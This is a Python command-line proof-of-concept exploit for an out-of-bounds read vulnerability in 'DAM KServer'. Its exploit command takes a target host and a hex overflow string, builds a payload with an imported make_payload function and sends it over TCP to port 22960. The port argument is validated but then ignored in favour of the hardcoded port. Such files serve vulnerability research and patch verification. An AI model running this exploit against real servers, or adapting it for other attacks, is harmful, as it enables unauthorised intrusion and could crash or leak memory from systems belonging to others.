import fire
import logging
import socket

from dam_k_server_hbbo_001 import make_payload


class Cli:
    """PoC of DAM KServer OOBR vulnerability CLI

    Args:
        log_level (str, optional): Log level. Defaults to "INFO". {CRITICAL|FATAL|ERROR|WARN|WARNING|INFO|DEBUG|NOTSET}
    """

    @staticmethod
    def __config_logger(level: str) -> None:
        """Config logger

        Args:
            level (str): Log level
        """

        logging.basicConfig(
            level=level,
            format="[%(asctime)s] %(levelname)s [%(name)s.%(funcName)s:%(lineno)d] %(message)s",
        )

    def __init__(self, log_level="INFO") -> None:
        """PoC of DAM KServer OOBR vulnerability CLI

        Args:
            log_level (str, optional): Log level. Defaults to "INFO". {CRITICAL|FATAL|ERROR|WARN|WARNING|INFO|DEBUG|NOTSET}
        """

        Cli.__config_logger(log_level)
        self.__logger = logging.getLogger(__name__)

    def exploit(
        self, host, port=22960, overflow_payload="0123456789ABCDEF"
    ) -> None:
        if not isinstance(host, str):
            raise ValueError("Argument `host` must be str.")
        if not isinstance(port, int):
            raise ValueError("Argument `port` must be int.")
        if not isinstance(overflow_payload, str):
            raise ValueError("Argument `overflow_payload` must be str.")

        overflow_payload = bytes.fromhex(overflow_payload)
        payload = make_payload(overflow_payload)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, 22960))
        sock.send(payload)
        sock.close()


def main() -> None:
    fire.Fire(Cli)


if __name__ == "__main__":
    main()
